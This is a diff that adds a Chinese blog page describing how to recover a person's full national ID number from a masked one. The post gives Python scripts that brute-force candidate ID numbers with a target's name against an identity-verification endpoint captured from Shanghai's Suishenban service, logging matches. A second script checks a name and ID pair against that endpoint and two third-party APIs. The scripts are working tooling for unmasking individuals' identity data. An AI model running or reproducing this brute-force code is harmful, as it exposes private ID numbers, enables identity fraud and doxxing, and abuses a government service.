@@ -1,0 +1,614 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>身份证二要素验证 | 山城冰荔枝</title>
+  <meta name="description" content="SfzVertify身份证二要素验证​	身份证号是的编排是有一定规律可循的。除了最后1位是校验位外，其余各位与出生地、出生日期、性别、出生编号息息相关，因此即使是经脱敏处理的身份证号，仍能通过程序分析的方式过滤出可能的身份证序列组合。所以我们可以通过出生地、出生日期、性别、出生编号这些信息进行身份证的猜解，从而实现身份证号码bp. 这个API是上海随申办身份证二要素抓包抓出来的1234567891">
+<meta property="og:type" content="article">
+<meta property="og:title" content="身份证二要素验证">
+<meta property="og:url" content="https://sfyyh.github.io/2022/08/17/%E8%BA%AB%E4%BB%BD%E8%AF%81%E4%BA%8C%E8%A6%81%E7%B4%A0%E9%AA%8C%E8%AF%81/index.html">
+<meta property="og:site_name" content="山城冰荔枝">
+<meta property="og:description" content="SfzVertify身份证二要素验证​	身份证号是的编排是有一定规律可循的。除了最后1位是校验位外，其余各位与出生地、出生日期、性别、出生编号息息相关，因此即使是经脱敏处理的身份证号，仍能通过程序分析的方式过滤出可能的身份证序列组合。所以我们可以通过出生地、出生日期、性别、出生编号这些信息进行身份证的猜解，从而实现身份证号码bp. 这个API是上海随申办身份证二要素抓包抓出来的1234567891">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://sfyyh.github.io/images/bg1.jpg">
+<meta property="article:published_time" content="2022-08-17T09:03:17.000Z">
+<meta property="article:modified_time" content="2023-08-17T09:07:17.004Z">
+<meta property="article:author" content="山城冰荔枝">
+<meta property="article:tag" content="网安">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://sfyyh.github.io/images/bg1.jpg">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://sfyyh.github.io/2022/08/17/%E8%BA%AB%E4%BB%BD%E8%AF%81%E4%BA%8C%E8%A6%81%E7%B4%A0%E9%AA%8C%E8%AF%81/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="山城冰荔枝" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/SFYYH" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">山城冰荔枝</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">Web Developer &amp; Designer</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> BeiJing, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="搜索" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="想要查找什么..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">首页</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">归档</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">分类</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">标签</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">项目</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">友链</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">关于</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/SFYYH" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">公告</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>跑起来会有风!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/proxy/">proxy</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/">实用技巧</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%8A%80%E6%9C%AF/">技术</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/">网站搭建</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="category-list-count">3</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/GitHub/" rel="tag">GitHub</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/clash/" rel="tag">clash</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dolphinscheduler/" rel="tag">dolphinscheduler</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kali-linux/" rel="tag">kali-linux</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/" rel="tag">大数据分析平台</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF/" rel="tag">宝塔面板</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A/" rel="tag">渗透必知必会</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA/" rel="tag">磁盘分区</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E5%AE%89/" rel="tag">网安</a><span class="tag-list-count">4</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E8%AF%BE/" rel="tag">网课</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget-body tagcloud">
+      <a href="/tags/GitHub/" style="font-size: 13.5px;">GitHub</a> <a href="/tags/clash/" style="font-size: 13px;">clash</a> <a href="/tags/dolphinscheduler/" style="font-size: 13.5px;">dolphinscheduler</a> <a href="/tags/kali-linux/" style="font-size: 13px;">kali-linux</a> <a href="/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/" style="font-size: 13.5px;">大数据分析平台</a> <a href="/tags/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF/" style="font-size: 13px;">宝塔面板</a> <a href="/tags/%E6%B8%97%E9%80%8F%E5%BF%85%E7%9F%A5%E5%BF%85%E4%BC%9A/" style="font-size: 13px;">渗透必知必会</a> <a href="/tags/%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA/" style="font-size: 13px;">磁盘分区</a> <a href="/tags/%E7%BD%91%E5%AE%89/" style="font-size: 14px;">网安</a> <a href="/tags/%E7%BD%91%E8%AF%BE/" style="font-size: 13px;">网课</a>
+    </div>
+  </div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">八月 2023</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">七月 2023</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">五月 2023</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/12/">十二月 2022</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">八月 2022</a><span class="archive-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/">实用技巧</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/08/18/kali-Linux%E7%A3%81%E7%9B%98%E6%89%A9%E5%AE%B9/" class="title">kali Linux磁盘扩容</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-08-18T06:30:54.000Z" itemprop="datePublished">2023-08-18</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/08/15/%E9%83%A8%E7%BD%B2CDN%E7%9A%84%E7%BD%91%E7%AB%99%E6%89%BE%E7%9C%9F%E5%AE%9EIP/" class="title">部署CDN的网站找真实IP</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-08-15T14:40:26.000Z" itemprop="datePublished">2023-08-15</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA/">网站搭建</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/08/07/%E5%AE%9D%E5%A1%94%E9%9D%A2%E6%9D%BF%E4%BC%81%E4%B8%9A%E7%89%88/" class="title">宝塔面板企业版</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-08-07T05:44:37.000Z" itemprop="datePublished">2023-08-07</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/08/03/my-first-blog/" class="title">记一次对小区wifi渗透</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-08-03T13:43:26.000Z" itemprop="datePublished">2023-08-03</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>
+              </p>
+              <p class="item-title">
+                <a href="/2023/07/20/%E4%B8%80%E6%AC%A1%E5%AF%B9dolphinscheduler%E7%9A%84%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/" class="title">一次对dolphinscheduler的源码分析</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2023-07-20T01:05:10.000Z" itemprop="datePublished">2023-07-20</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-身份证二要素验证" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      身份证二要素验证
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2022/08/17/%E8%BA%AB%E4%BB%BD%E8%AF%81%E4%BA%8C%E8%A6%81%E7%B4%A0%E9%AA%8C%E8%AF%81/" class="article-date">
+	  <time datetime="2022-08-17T09:03:17.000Z" itemprop="datePublished">2022-08-17</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF/">技术</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/%E7%BD%91%E5%AE%89/" rel="tag">网安</a>
+  </span>
+
+
+        
+	<span class="article-read hidden-xs">
+	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
+	    <span id="busuanzi_container_page_pv">
+			<span id="busuanzi_value_page_pv">0</span>
+		</span>
+	</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/08/17/%E8%BA%AB%E4%BB%BD%E8%AF%81%E4%BA%8C%E8%A6%81%E7%B4%A0%E9%AA%8C%E8%AF%81/#comments" class="article-comment-link">评论</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 921(字)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 4(分)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="SfzVertify"><a href="#SfzVertify" class="headerlink" title="SfzVertify"></a>SfzVertify</h1><h2 id="身份证二要素验证"><a href="#身份证二要素验证" class="headerlink" title="身份证二要素验证"></a>身份证二要素验证</h2><p>​	身份证号是的编排是有<strong>一定规律可循</strong>的。除了最后1位是校验位外，其余各位与<strong>出生地</strong>、<strong>出生日期</strong>、<strong>性别</strong>、<strong>出生编号</strong>息息相关，因此即使是<strong>经脱敏处理</strong>的身份证号，仍能通过程序分析的方式过滤出可能的<strong>身份证序列组合</strong>。所以我们可以通过<strong>出生地</strong>、<strong>出生日期</strong>、<strong>性别</strong>、<strong>出生编号</strong>这些信息进行身份证的猜解，从而实现身份证号码bp.</p>
+<h3 id="这个API是上海随申办身份证二要素抓包抓出来的"><a href="#这个API是上海随申办身份证二要素抓包抓出来的" class="headerlink" title="这个API是上海随申办身份证二要素抓包抓出来的"></a>这个API是上海随申办身份证二要素抓包抓出来的</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>():</span><br><span class="line">    url = <span class="string">&quot;https://suishenmafront1.sh.gov.cn/smzy/yqfkewm/relative/idcard-auth&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Linux; Android 12; M2012K11AC Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4343 MMWEBSDK/20221011 Mobile Safari/537.36 MMWEBID/4555 MicroMessenger/8.0.30.2260(0x28001E3B) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wxc5059c3803665d9c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;com.tencent.mm&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    pron_name=<span class="built_in">input</span>(<span class="string">&quot;请输入要验证的名字：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;进行二要素验证，请耐心等待..........&quot;</span>)</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;sfz.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        line = line.strip()</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;name&quot;</span>: <span class="string">f&quot;<span class="subst">&#123;pron_name&#125;</span>&quot;</span>,</span><br><span class="line">            <span class="string">&quot;id_card&quot;</span>: line,</span><br><span class="line">            <span class="string">&quot;mw&quot;</span>: <span class="string">&quot;tChGO5otqa6EEnpLpO5bfyXgLMtLQFynXhpsSS3ZDPWi29wZbe0TuOhDMUwl3QSP6YEJKJShiBUn820KajqFDahFOCyQnr 3YRqdWy 2Pw9PzvCa GP2nm7KWFSzrrlFr/LzA2sPTCPPoRK/UvENLQ==&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, headers=headers, json=data).json()</span><br><span class="line">            <span class="keyword">if</span> (r[<span class="string">&#x27;code&#x27;</span>] == <span class="number">200</span>):</span><br><span class="line">                fok = <span class="built_in">open</span>(<span class="string">&quot;successful.txt&quot;</span>, <span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line">                fok.write(line)</span><br><span class="line">                fok.close</span><br><span class="line">            <span class="built_in">print</span>(line + <span class="string">&quot;|&quot;</span> + <span class="built_in">str</span>(r[<span class="string">&#x27;code&#x27;</span>]))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            fe = <span class="built_in">open</span>(<span class="string">&quot;fail.txt&quot;</span>, <span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line">            fe.write(line)</span><br><span class="line">            fe.close</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="其他API"><a href="#其他API" class="headerlink" title="其他API"></a>其他API</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys, requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">suishenma</span>(<span class="params">name, idcard</span>):</span><br><span class="line">    url = <span class="string">&quot;https://suishenmafront1.sh.gov.cn/smzy/yqfkewm/relative/idcard-auth&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Linux; Android 12; M2012K11AC Build/SKQ1.211006.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4343 MMWEBSDK/20221011 Mobile Safari/537.36 MMWEBID/4555 MicroMessenger/8.0.30.2260(0x28001E3B) WeChat/arm64 Weixin NetType/5G Language/zh_CN ABI/arm64 miniProgram/wxc5059c3803665d9c&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;com.tencent.mm&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: name,</span><br><span class="line">        <span class="string">&quot;id_card&quot;</span>: <span class="built_in">str</span>(idcard),</span><br><span class="line">        <span class="string">&quot;mw&quot;</span>: <span class="string">&quot;tChGO5otqa6EEnpLpO5bfyXgLMtLQFynXhpsSS3ZDPWi29wZbe0TuOhDMUwl3QSP6YEJKJShiBUn820KajqFDahFOCyQnr 3YRqdWy 2Pw9PzvCa GP2nm7KWFSzrrlFr/LzA2sPTCPPoRK/UvENLQ==&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(url, headers=headers, json=data)</span><br><span class="line"></span><br><span class="line">        rescode = r.json()[<span class="string">&quot;code&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> (rescode == <span class="number">200</span>):</span><br><span class="line">            status = <span class="string">&quot;校验正确&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            status = r.json()[<span class="string">&quot;message&quot;</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;上海随申码: &quot;</span> + status)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">guyunge</span>(<span class="params">name, idcard</span>):</span><br><span class="line">    url = <span class="string">&quot;https://api.guyunge.top/API/er.php&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: name,</span><br><span class="line">        <span class="string">&quot;card&quot;</span>: <span class="built_in">str</span>(idcard),</span><br><span class="line">        <span class="string">&quot;type&quot;</span>: <span class="string">&quot;json&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(url, headers=headers, data=data)</span><br><span class="line"></span><br><span class="line">        rescode = r.json()[<span class="string">&quot;code&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> (rescode == <span class="number">1</span>):</span><br><span class="line">            status = <span class="string">&quot;校验正确&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            status = r.json()[<span class="string">&quot;text&quot;</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;孤云阁API: &quot;</span> + status)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tingfengke</span>(<span class="params">name, idcard</span>):</span><br><span class="line">    url = <span class="string">&quot;http://tc.tfkapi.top/API/eysjy.php&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;name&quot;</span>: name,</span><br><span class="line">        <span class="string">&quot;num&quot;</span>: <span class="built_in">str</span>(idcard),</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url, headers=headers, params=data).text</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (r == <span class="string">&quot;校验成功-TFK&quot;</span>):</span><br><span class="line">            status = <span class="string">&quot;校验正确&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            status = r</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;听风客API: &quot;</span> + status)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    suishenma(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    guyunge(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    tingfengke(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br></pre></td></tr></table></figure>
+
